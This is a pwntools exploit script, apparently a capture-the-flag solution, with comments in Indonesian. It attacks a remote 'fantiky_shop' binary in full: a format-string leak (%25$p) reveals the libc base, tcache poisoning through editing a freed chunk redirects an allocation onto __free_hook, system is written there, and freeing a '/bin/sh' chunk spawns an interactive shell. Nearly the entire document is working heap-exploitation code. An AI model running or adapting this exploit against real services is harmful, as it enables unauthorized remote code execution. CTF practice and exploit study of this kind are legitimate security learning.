from pwn import *

# Context setup
elf = context.binary = ELF('./fantiky_shop_patched')
libc = ELF('./libc-2.31.so')

# --- TARGET REMOTE ---
p = remote('tasks.4x10m.ru', 20484)

def add(idx, serial, desc):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', serial)
    p.recvuntil(b': ') # Skip "Проверка кода: "
    leak = p.recvline().strip()
    p.sendafter(b': ', desc)
    return leak

def edit(idx, desc):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'? ', str(idx).encode()) # Prompt edit pakai '?'
    p.sendafter(b': ', desc)

def free(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b': ', str(idx).encode())

# --- LANGKAH 1: Leak Libc Base ---
log.info("Mendapatkan leak dari server remote...")
leak_data = add(0, b"%25$p", b"A")
leak_addr = int(leak_data, 16)

# Formula: leak - offset_start_main - distance_to_ret (243)
libc.address = leak_addr - 0x23f90 - 243
log.success(f"Remote Libc Base: {hex(libc.address)}")

# --- LANGKAH 2: Tcache Poisoning (Dua Chunk) ---
log.info("Poisoning Tcache di remote...")
add(1, b"B", b"chunk1")
add(2, b"C", b"chunk2")
free(2)
free(1)

# Manipulasi FD/next pointer ke __free_hook
edit(1, p64(libc.sym['__free_hook']))

# --- LANGKAH 3: Overwrite __free_hook ---
log.info("Mengambil __free_hook dan menimpanya dengan system...")
add(3, b"D", b"cleaner") 
add(4, b"E", p64(libc.sym['system']))

# --- LANGKAH 4: Pop Shell ---
log.info("Triggering shell on remote...")
add(5, b"F", b"/bin/sh\x00")
free(5)

p.interactive()
